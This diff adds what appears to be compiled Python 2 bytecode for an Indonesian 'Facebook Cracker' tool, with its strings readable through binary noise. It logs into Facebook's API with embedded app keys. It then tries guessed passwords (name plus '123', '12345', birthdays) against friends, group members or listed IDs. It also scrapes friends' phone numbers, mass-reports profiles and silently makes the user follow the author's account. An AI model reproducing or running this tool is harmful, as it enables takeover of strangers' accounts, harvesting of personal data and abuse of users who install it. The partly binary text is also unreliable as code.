@@ -1,0 +1,393 @@
+�
+�1`c@s=ddlZddlZddlZddlZddlZddlZddlZddlZddlZddl	Z	ddl
+Z
+ddlmZyddl
+Z
+Wnek
+r�ejd�nXddlmZddlmZyddlZWnek
+rejd�nXee�ejd�ej�Zeje�ejejj�dd	�d3ge_ejd�Zd
+�Zd�Z dZ!dZ"dZ#dZ$dZ%dZ&dZ'dZ(dZ)dZ*de!e&e"e$e%fZ+de!e&e%fZ,d�Z-dZ.gZ/gZ0gZ1gZ2gZ3gZ4gZ5gZ6gZ7gZ8gZ9gZ:gZ;gZ<gZ=gZ>dZ?d�Z@d�ZAd �ZBd!�ZCd"�ZDd#�ZEd$�ZFd%�ZGd&�ZHd'�ZId(�ZJd)�ZKd*�ZLd+�ZMd,�ZNeOd-�ZPd.�ZQd/�ZRd0�ZSd1�ZTeUd2kr9e@�ndS(4i����N(t
+ThreadPoolspip2 install requests(tConnectionError(tBrowserspip2 install mechanizetutf8tmax_timeis
+User-AgentsROpera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s%S:%M:%HcCsdGHtjj�dS(Ns[1;91m[!] Program Closed(tostsystexit(((s1.pytquitscCsCx<|dD]0}tjj|�tjj�tjd�qWdS(Ns
+g{�G�z�?(Rtstdouttwritetflushttimetsleep(tzte((s1.pytloadings
+s[1;91ms[1;95ms[1;97ms[1;92ms[1;0ms[1;93ms[1;32m[[1;36m+[1;32m][0ms[1;32m[[1;31m![1;32m][0ms[1;32mSuccessful[0ms[1;31mFailed[0ms�%s
+    .___.__  __          .
+    [__ [__)/  `._. _. _.;_/ _ ._.
+    |   [__)\__.[  (_](_.| \(/,[
+               %s v0.0 %s -  
+    =====[ Facebook Cracker ]=====
+         %s By Mr.Lukman %s 
+s�%s
+    .___.__  __          .
+    [__ [__)/  `._. _. _.;_/ _ ._.
+    |   [__)\__.[  (_](_.| \(/,[ 
+             %s  99999
+     %s 
+cCsttd�dS(Ns
+[*] Please Wait... 
+(RtG(((s1.pytloadGsisids.txtcCstjd�ytdd�}t�Wn�ttfk
+rtjd�tGHtdtGHt	t
+dtdt�}t
+j
+t
+dtdt�}tjd�t�ytjd�Wn$tjk
+r�d	tGHt�nXttj_tjd
+d�|tjd<|tjd
+<tj�tj�}d|kr�y;d|d|d}idd6dd6|d6dd6dd6dd6dd6dd6|d6dd 6d!d"6}tjd#�}|j|�|j�}|ji|d$6�d%}tj|d&|�}t j!|j"�}	tdd'�}
+|
+j#|	d(�|
+j$�d)GHtj%d*|	d(�tjd+�t&j'd,�t�Wq�tj(j)k
+r�td-GHt*�q�Xnd.|kr�d/GHtjd0�t&j'd,�t*�qd1GHtjd0�t&j'd,�t+�nXdS(2Ntclears	login.txttrs    Login Your Facebook Accounts
+    Email s > s
+    Paswd shttps://m.facebook.coms+
+[1;91m[!] Please Check your Connection!
+
+tnritemailtpassssave-devicesGapi_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t 882a8490361da98702bf97a021ddc14dtapi_keytpasswordtcredentials_typetJSONtformatt1tgenerate_machine_idtgenerate_session_cookiesten_UStlocales
+auth.logintmethodt0treturn_ssl_resourcess1.0tvtmd5tsigs'https://api.facebook.com/restserver.phptparamstwtaccess_tokens
+[#] Login Successfully!!sMhttps://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=s@xdg-open https://www.facebook.com/profile.php?id=100060845318179is!
+[!] Please Check your Connectiont
+checkpoints3
+[1;91m[!] [1;93mYour Account Has Been Checkpointsrm -rf login.txts
+[1;91m[!] Login Failed!(,RtsystemtopentmenutKeyErrortIOErrortbanner2RtNt	raw_inputtVtRtWtgetpassRtbrt	mechanizetURLErrorRtTruet_factorytis_htmltselect_formtformtsubmittgeturlthashlibtnewtupdatet	hexdigesttrequeststgettjsontloadsttextR
+tclosetpostRR
+t
+exceptionsRRtlogin(ttokettidtpwdturlR(tdatatxtaRRtzedd((s1.pyRO`sl
+
+
+
+	
+
+
+S
+
+
+
+	
+
+
+
+
+cCsHytdd�j�}WnHtk
+rctjd�tdGHtjd�tjd�t�n�Xyvt	j
+d|�}tj|j
+�}|d}|d	}t	j
+d
+|�}tj|j
+�}t|dd�}Wnftk
+rtjd�tjd�tjd�t�n(t	jjk
+rBtGHd
+GHt�nXtjd�tGHtdtdt|tdGHtd(tdttdtd)tGHtdtdGHtdtdGHtdtdGHtdtdGHtdtdGHtdtd GHtd!td"GHtd#td$GHtd%td&GHd'GHt�dS(*Ns	login.txtRRs[!] Token not foundsrm -rf login.txtis+https://graph.facebook.com/me?access_token=tnameRQs7https://graph.facebook.com/me/subscribers?access_token=tsummaryttotal_counts'[1;91m[!]Please Check your Connection!s Anak Lontes [ s ] it-s
+[ [1;97mMenus ]s 1.s Start Crackings 2.s Dump Group ID'ss 3.s Dump Phone Numberss 4.s Profile Guards 5.s Auto Reactions 6.s Auto Reports 7.s
+ Developers 8.s Logouts 0.s Exitts---------------s---------------(R.treadR1RR-R6RR
+RORGRHRIRJRKtstrR0RNRtbannerRR5R3RR7tpilih(RPtotwRVtnamaRQtotstbtsub((s1.pyR/�sP
+
+	
+
+
+
+
+
+
+
+
+
+!)cCs�ttdtdt�}|dkr7dGHt�nR|dkrMt�n<|dkrct�n&|dkryt�n|dkr�t�n�|d	kr�t	�t
+jd
+�n�|dkr�dGHt�n�|d
+krt
+jd�dGHdGHtd�t�n�|dkr't
+jd�t�nb|dkryt
+jd�tdtGHttdtdtdt�t�ntdGHt�dS(Ns
+~@adapcsg s▶ R\s[1;91m [!] Empty commandRt2t3t4t5it6sNot Available Nowt7Rs [1;93mRecoded : [1;92mMr.LukmanitoX
+ [1;93mTeam : [1;92mCyber pemalang army  
+ [1;93mFacebook : [1;92mhttps://www.facebook.com/profile.php?id=100060845318179 
+[1;93m Github : [1;92mhttps://www.github.com/CYBERX507X 
+[1;93m WatssAp : \+62 895-4228-18801s
+s
+[1;91m[ [1;97mBack [1;91m]t8srm -rf login.txtR$sBye Bye Tool Love Mr.Lukman <3s[ tQuits ]s [+] Wrong Command!(R4RR6R7R`tsupertdumpgtphonetguardt	autolikerRR
+R/RR-RR3(RW((s1.pyR`�sD
+
+
+
+
+
+
+
+
+
+
+
+
+"
+	cCs�y�tjd�tGHttdtdt�}d|}|}tj|�ttdtdtdtdtdtd	t�}t	�SWnt
+�nXdS(
+NRs[+]s Enter Target Id: shttps://m.facebook.com/s[*] sDo You Want To Report 
+s [y/yes] :
+s	 RootSec s▶ (RR-R_R4R6RR7R9R.trepR/(RQtmyRStdray((s1.pytreport�s
+
+
+<cCsmttd�}|j�}t|krbtdGHtjd�tjtd�tjd�t�St�SdS(NRs.  Oops 405isError While Reporting the Id(	R.tidsR]RQR6RR
+ttest1ttest2(RUty((s1.pyRs�s	
+
+cCs�tj�j�}tj|dd�}t|�dkr�xN|jddt�D]4}d|dkrO|d}tj|�t	�SqOWndS(Ntfeaturesshtml.parseriRVthreftrapid_report(
+R9tresponseR]tbs4t
+BeautifulSouptlentfind_allR<R.Ry(t_bstbbRUt_cadow((s1.pyRxs	
+
+cCs`yAttj_tjdd�dgtjd<tj�t�SWntk
+r[}dGHnXdS(NRitprofile_fake_accountttags [+] Bad404(	R<R9R=R>R?R@RAttest3t	Exception(tf((s1.pyRys
+cCs`yAttj_tjdd�dgtjd<tj�t�SWntk
+r[}dGHnXdS(NRitFRX_PROFILE_REPORT_CONFIRMATIONt
+action_keys
+    Bad405(	R<R9R=R>R?R@RAt_test4R�(R�((s1.pyR�!s
+cCs�y�ttj_tjdd�dgtjd<tj�ttd�}|j	t
+�dGHtjd�t
+dGHtjd	�t�Wntk
+r�}d
+GHnXdS(NRityestcheckedR*R\is[-]Reported is    Cyber x507x(R<R9R=R>R?R@RAR.RwR
+t_idRR
+RRR�(tjjR�((s1.pyttest4+s
+
+
+	
+cCs�tjd�ytdd�j�}Wn7tk
+r_dGHtjd�tjd�t�nXtjd�tGHt	dGHt	dGHt	d	GHt	d
+GHt	dGHt	dGHt
+d
+GHt�dS(NRs	login.txtRs[1;91m[!] Token not foundsrm -rf login.txtis1. [1;95mLikes2. [1;92mLoves
+3. [1;93mWows4. [1;93mHahas
+5. [1;94mSads6. [1;91mAngrys0. [1;97mBack(RR-R.R]R1RR
+ROR_RR6treact(RP((s1.pyRr@s$
+
+
+
+
+							cCs�td�}|dkr"t�n�|dkr>dat�n�|dkrZdat�n�|dkrvdat�n~|d	kr�d
+at�nb|dkr�dat�nF|d
+kr�dat�n*|dkr�t�ndtdGHt�dS(Ns[1;91m-►[1;97m R\RtLIKERftLOVERgtWOWRhtHAHARitSADRjtANGRYR$s[1;91m[✖] [1;97ms [1;91mTidak ada(R4R�ttipetrootR/taksi(tkai((s1.pyR�Vs2
+
+
+
+
+
+
+
+
+cCs�tjd�ytdd�j�}Wn7tk
+r_dGHtjd�tjd�t�n^Xtjd�tGHdt	d	t
+GHtd
+�}td�}y�tj
+d|d
+|d|�}tj|j�}td�dGHxo|ddD]_}|d}tj|�tjd|dtd|�d|d jdd�dtGHq�WHdttt��GHtd�t�Wn>tk
+r�dGHtd�t�ntk
+r�t�nXdS(NRs	login.txtRs[1;91m[!] Token not foundsrm -rf login.txtii
+t s[ Auto React ]
+s,[1;91m[+] [1;92mID Target [1;91m:[1;97m s([1;91m[!] [1;92mLimit [1;91m:[1;97m shttps://graph.facebook.com/s?fields=feed.limit(s)&access_token=s*[1;91m[✺] [1;92mPlease wait [1;97m...R\tfeedRTRQs/reactions?type=s&access_token=s[1;92m[[1;97ms
+s... [1;92m] [1;97ms!
+[1;91m[+][1;97m Result [1;96ms
+[1;91m[ [1;97mBack [1;91m]s[1;91m[!] Wrong IDs
+          (RR-R.R]R1RR
+ROR_RR3R4RGRHRIRJRKRtreaksitappendRMR�treplaceR^R�R/R0tKeyboardInterrupt(RPtidetlimittohtahRVRz((s1.pyR�{sB
+
+
+
+
+#
+
+
+!%
+
+
+
+
+cCs�tjd�ytdd�j�aWn;tk
+rctdGHtjd�tjd�t	�nXtjd�t
+GHdtd	tGHtd
+t
+dtdtGHtd
+t
+d
+tdtGHtd
+t
+dtdtGHdGHt�dS(NRs	login.txtRs[!] Token not foundsrm -rf login.txtii
+R�s[ Profile Guard ]
+t[t01s] Enablet02s	] Disablet00s] BackR\s
+          (RR-R.R]RPR1R6RR
+ROR_RR3R7tturn(((s1.pyRq�s 
+
+	
+
+
+cCs�ttdtdt�}|dks4|dkrJd}tt|�n�|dksb|dkrxd}tt|�nY|d	ks�|d
+kr�t�n7|dkr�tdtGHt�ntdtGHt�dS(
+NtRootSecs ▶ RR�ttrueRfR�tfalseR$R�R\sCan't be Empty(	R4RR6R7tgazRPR/R3R�(tgtOntOff((s1.pyR��s
+
+
+
+cCs3d|}tj|�}tj|j�}|dS(Ns-https://graph.facebook.com/me?access_token=%sRQ(RGRHRIRJRK(RPRStrestuid((s1.pyt
+get_userid�s
+cCs�t|�}d|t|�f}idd6d|d6}d}tj|d|d|�}|jGHd	|jkr�tjd
+�tGHdGHdGHtd
+�t	�nKd|jkr�tjd
+�tGHdGHdGHtd
+�t	�ndGHt
+�dS(Ns�variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutations!application/x-www-form-urlencodedsContent-TypesOAuth %st
+Authorizations"https://graph.facebook.com/graphqlRTtheaderss"is_shielded":trueRR\s+[1;91m[[1;96m✓[1;91m] [1;92mActivateds
+[1;91m[ [1;97mBack [1;91m]s"is_shielded":falses-[1;91m[[1;96m✓[1;91m] [1;91mDeactivateds[1;91m[!] Error(R�R^RGRMRKRR-R_R4RqR/(RPtenableRQRTR�RSR�((s1.pyR��s,
+
+
+
+
+
+cCs�tjd�ytdd�j�}Wn7tk
+r_dGHtjd�tjd�t�n�Xtjd�tGHt	d�dGHy�t
+jd	|�}tj
+|j�}x�|d
+D]y}|d}|d}td
+d�}tj|�tdtdtt|�GHtdtdtt|�GHdGHq�Wdtt�GH|j�td�t�Wn�ttfk
+r�dGHtd�t�notk
+r�dGHtd�t�nIt
+jjk
+r�dGHt�n'tk
+r�dGHtd�t�nXdS(NRs	login.txtRs[1;91m[!] Token not foundsrm -rf login.txtis Please wait ...R\s2https://graph.facebook.com/me/groups?access_token=RTRXRQsid.txtR*s	[+] Name s-> s	[-] ID   s
+[+] Total Groups : %ss
+[1;91m[ [1;97mBack [1;91m]s[1;91m[!] Stoppeds[1;91m[!] Group not founds[1;91m[✖] No connections#[1;91m[!] Error when creating file(RR-R.R]R1RR
+ROR_RRGRHRIRJRKtlistgrupR�RR5R7R^R�RLR4R/R�tEOFErrorR0RNRR(RPtuhtgrouptpRbRQR�((s1.pyRo�sT
+
+
+
+
+
+
+
+
+	
+
+
+
+
+
+
+
+
+
+cCs�tjd�ytdd�j�}Wn7tk
+r_dGHtjd�tjd�t�nXytjd�Wnt	k
+r�nXy�tjd�t
+GHtd�d	|}tj
+|�}tj|j�}td
+d�}x�|dD]�}tj
+d
+|dd|�}tj|j�}yxtj|d�|j|dd�dttt��d|ddt|ddGtjj�tjd�Wq�tk
+r�q�Xq�W|j�dGHdtt�GHtd�}tjd
+d|�d|GHtd�t�Wn�tk
+r2dGHtd�t�nutt fk
+r^dGHtd�t�nItk
+r�dGHtd�t�n#tj!j"k
+r�d GHt#�nXdS(!NRs	login.txtRs[1;91m[!] Token not foundsrm -rf login.txtitresults&[1;92m Getting friends mobile number s3https://graph.facebook.com/me/friends?access_token=sresult/phone_number.txtR*RTshttps://graph.facebook.com/RQs?access_token=tmobile_phones
+s	
+[1;92m s[1;97m.[1;97m  [1;92mRXR�g-C��6?sD
+[1;91m[[1;96m?[1;91m] [1;92mSuccessfully get number [1;97m....s2
+[1;91m[+] [1;92mTotal Number [1;91m: [1;97m%ss7
+[1;91m[+] [1;92mSave file with name[1;91m :[1;97m sresult/s2
+[1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s
+[1;91m[ [1;97mBack [1;91m]s[1;91m[!] Error creating files[1;91m[!] Stoppeds[1;91m[!] Errors$[1;91m Please Check Your Connection($RR-R.R]R1RR
+ROtmkdirtOSErrorR2RRGRHRIRJRKthpR�R
+R^R�R5RR	RR0RLR4trenameR/R�R�RNRR(RPRSRRtbztnRUtdone((s1.pyRp"sl
+
+
+
+
+
+
+
+4
+
+
+	
+
+
+
+
+
+
+
+
+cCs�tjd�ytdd�j�aWn7tk
+r_dGHtjd�tjd�t�nXtjd�t	GHt
+dtdGHt
+d	td
+GHt
+dtdGHt
+d
+tdGHdGHt
+�dS(NRs	login.txtRs[1;91m[!] Token not foundsrm -rf login.txtis 1.s Cracked from friends Facebooks 2.s Cracked from Group Facebooks 3.s Cracked from File IDs 0.s ExitR\(RR-R.R]RPR1RR
+ROR_R7RR6tpilih_super(((s1.pyRn\s 
+
+
+
+
+cCs�ttd�}|dkr+dGHt�n|dkr�tjd�tGHttdtd�tj	dt
+�}tj|j
+�}x�|d	D]}tj|d
+�q�Wn�|dkr�tjd�tGHtd�}y>tj	d
+|dt
+�}tj|j
+�}d|dGHWn'tk
+r>dGHtd�t�nXtj	d|dt
+�}tj|j
+�}x�|d	D]}tj|d
+�qwWn�|dkrtjd�yHtGHtd�}x0t|d�j�D]}	tj|	j��q�WWq-q-Xn*|dkrt�nd|dGHt�tdtdttt��GHttd�d�}
+td�}|j|
+t�d GHtd�t�dS(!Ns adapcsg[1;91m >[1;97m R\s[1;91m[!] Empty commandRRs[+] sTunggu Sayang Masih Crecking...s3https://graph.facebook.com/me/friends?access_token=RTRQRfs-[1;91m[+] [1;92m Group ID  [1;91m:[1;97m s%https://graph.facebook.com/group/?id=s&access_token=s=[1;91m[[1;96m✓[1;91m] [1;92mName Group [1;91m:[1;97m RXs[1;91m[!] Group not founds
+[1;91m[ [1;97mBack [1;91m]shttps://graph.facebook.com/s5/members?fields=name,id&limit=999999999&access_token=Rgs+[1;91m[+] [1;92m File ID  [1;91m:[1;97mRR$s[1;91m[✖] [1;97ms [1;91mCan't be Emptys[+]s Total ID [1;91m: [1;97ms[=] Please wait [1;97m...
+c
+SsS|}y?tjd|dt�}tj|j�}|dd}tjd|d|d�}tj|�}d|kr�d	|d
+|GHn�d|dkr�d
+|d|GHn�|dd}tjd|d|d�}tj|�}d|krd	|d
+|GHn2d|dkr6d
+|d|GHn|dd}tjd|d|d�}tj|�}d|kr�d	|d
+|GHn�d|dkr�d
+|d|GHn�|d}	|	j	dd�}
+tjd|d|
+d�}tj|�}d|kr d	|d
+|
+GHn$d|dkrDd
+|d|
+GHn|dd}tjd|d|d�}tj|�}d|kr�d	|d
+|GHn�d|dkr�d
+|d|GHn�|dd}tjd|d|d�}tj|�}d|kr d	|d
+|GHn$d|dkrDd
+|d|GHnWnnXdS(Nshttps://graph.facebook.com/s/?access_token=t
+first_namet123s�https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s&locale=en_US&password=sH&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R+s
+[1;95m Email :[1;97m s 
+[1;95m Password :[1;97m swww.facebook.comt	error_msgs
+[1;91m Email :[1;97m s 
+[1;91m Password :[1;97m t12345t	last_nametbirthdayt/R\t04(
+RGRHRPRIRJRKturllibturlopenRR�(
+targtuserRVRdtpass1RTtqtpass2tpass3tbirthtpass4tpass5tpass6((s1.pytmain�sd
+is
+[1;91m[+] [1;97mFinish(R4RR�RR-R_RR5RGRHRPRIRJRKRQR�R0RnR.t	readlineststripR/R^R�Rtmap(tpeakRRtstidgtaswtretitidlisttlineR�R�((s1.pyR�qsb
+
+
+
+
+
+
+
+!	A
+t__main__(s
+User-AgentsROpera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(VRRRtdatetimetrandomRCR�t	threadingRIR8R�tmultiprocessing.poolRRGtImportErrorR-trequests.exceptionsRR:RtreloadtsetdefaultencodingR9tset_handle_robotstFalsetset_handle_refresht_httptHTTPRefreshProcessort
+addheaderststrftimetinfoRRR6R5R7RR3tYtgoodtbadtsuccesstfailedR2R_Rtbacktthreadstberhasiltcekpointtgagalt	idfriendst
+idfromfriendstidmemRQtemt
+emfromfriendsR�t
+hpfromfriendsR�t
+reaksigruptkomenR�RwROR/R`RvRsRxRyR�R�RrR�R�RqR�R�R<R�RoRpRnR�t__name__(((s1.pyt<module>s��
+
+
+
+
+		
+		<	-	)	
+			
+	
+			%	*				1	:		{
